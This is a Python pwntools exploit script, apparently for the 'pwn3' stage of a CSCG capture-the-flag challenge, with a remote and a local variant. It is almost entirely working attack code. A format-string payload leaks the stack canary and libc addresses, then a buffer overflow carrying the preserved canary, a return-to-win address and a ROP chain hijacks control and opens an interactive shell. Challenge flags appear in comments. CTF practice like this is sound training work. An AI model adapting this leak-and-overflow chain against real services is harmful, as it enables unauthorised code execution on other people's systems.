from pwn import *
import roppergen as ropgen

#p=process("./pwn3")
p=remote("hax1.allesctf.net",9102)
#pwdch1Real=b"CSCG{NOW_PRACTICE_MORE}"
#pwdch1=b"CSCG{FLAG_FROM_STAGE_1}"
#pwdch=b"CSCG{THIS_IS_TEST_FLAG}"
pwdch=b"CSCG{NOW_GET_VOLDEMORT}"

p.recvuntil("Enter the password of stage 2:")
p.sendline(pwdch)

FStr="|".join(["%p" for _ in range(42)])
p.recvuntil("Enter your witch name:")
p.sendline(FStr+"|")
leak=p.recvuntil("enter your magic spell:").split(b"|")
print(leak)
print(leak[-5])
canary=int(leak[-5],16)
system=int(leak[2],16)-0xbbe37
libcBase=system-0x554e0
print(hex(system))
print(leak[-3])
print(hex(int(leak[-3],16)-0x37))
main=int(leak[-3],16)-0x37
main_win_off=0x1f3
win_addr=main-main_win_off
ret_addr=win_addr+0x2a
leave_main=main+0x42
print(hex(win_addr))
input('attach')
spell=b"Expelliarmus\x00"
pad=b"x"*(0xff-13+9)
print(spell+pad+p64(canary))
pad2=b"x"*cyclic_find(b'caaadaaa')

ropch=ropgen.main(libcBase)

p.sendline(spell+pad+p64(canary)+pad2+p64(ret_addr)+p64(win_addr)+ropch)

#p.sendline(spell+pad+p64(canary)+pad2+p64(ret_addr)+p64(win_addr)+p64(leave_main)+p64(system)+b"x"*4)

p.interactive()
#CSCG{NOW_GET_VOLDEMORT}
#CSCG{VOLDEMORT_DID_NOTHING_WRONG}

exit()

from pwn import *

p=process("./pwn3")
#p=remote("hax1.allesctf.net",9101)
#pwdch1Real=b"CSCG{NOW_PRACTICE_MORE}"
#pwdch1=b"CSCG{FLAG_FROM_STAGE_1}"
pwdch=b"CSCG{THIS_IS_TEST_FLAG}"

p.recvuntil("Enter the password of stage 2:")
p.sendline(pwdch)

FStr="|".join(["%p" for _ in range(42)])
p.recvuntil("Enter your witch name:")
p.sendline(FStr+"|")
leak=p.recvuntil("enter your magic spell:").split(b"|")
print(leak)
print(leak[-5])
canary=int(leak[-5],16)
system=int(leak[2],16)-0xbbe37
print(hex(system))
print(leak[-3])
print(hex(int(leak[-3],16)-0x37))
main=int(leak[-3],16)-0x37
main_win_off=0x1fa
win_addr=main-main_win_off
ret_addr=win_addr+0x36
print(hex(win_addr))
input('attach')
spell=b"Expelliarmus\x00"
#padding=b'X'*cyclic_find(b"cnaacoaa")
pad=b"x"*(0xff-13+9)
print(spell+pad+p64(canary))
pad2=b"x"*cyclic_find(b'caaadaaa')
p.sendline(spell+pad+p64(canary)+pad2+p64(ret_addr)+p64(win_addr))

p.interactive()
#CSCG{NOW_GET_VOLDEMORT}
